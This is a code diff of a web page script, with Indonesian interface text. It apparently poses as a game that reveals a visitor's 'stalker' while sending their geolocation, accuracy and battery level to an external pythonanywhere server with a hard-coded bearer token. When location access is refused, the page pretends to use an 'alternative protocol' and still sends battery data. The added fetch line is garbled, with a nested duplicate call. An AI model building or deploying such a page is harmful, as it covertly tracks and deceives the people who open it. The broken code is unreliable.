@@ -84,9 +84,12 @@
     };
 
     function sendLog(lat, lon, acc, battery) {
-      fetch("/log", {
+      fetch("fetch("https://cobraanotdeveloper.pythonanywhere.com/log", {", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer cobraproject"
+        },
         body: JSON.stringify({
           lat: lat,
           lon: lon,
@@ -99,6 +102,8 @@
       }).then(() => {
         const name = randomNames[Math.floor(Math.random() * randomNames.length)];
         result.innerHTML = `🔍 Penguntitmu: <b>${name}</b>`;
+      }).catch(() => {
+        result.innerHTML = "❌ Gagal kirim ke server.";
       });
     }
 
@@ -125,7 +130,7 @@
             sendLog(lat, lon, acc, "Unknown");
           });
         },
-        (err) => {
+        () => {
           result.innerHTML = "⚠️ Akses lokasi ditolak. Menggunakan protokol alternatif...";
           navigator.getBattery().then((batt) => {
             const battery = Math.round(batt.level * 100) + "%";
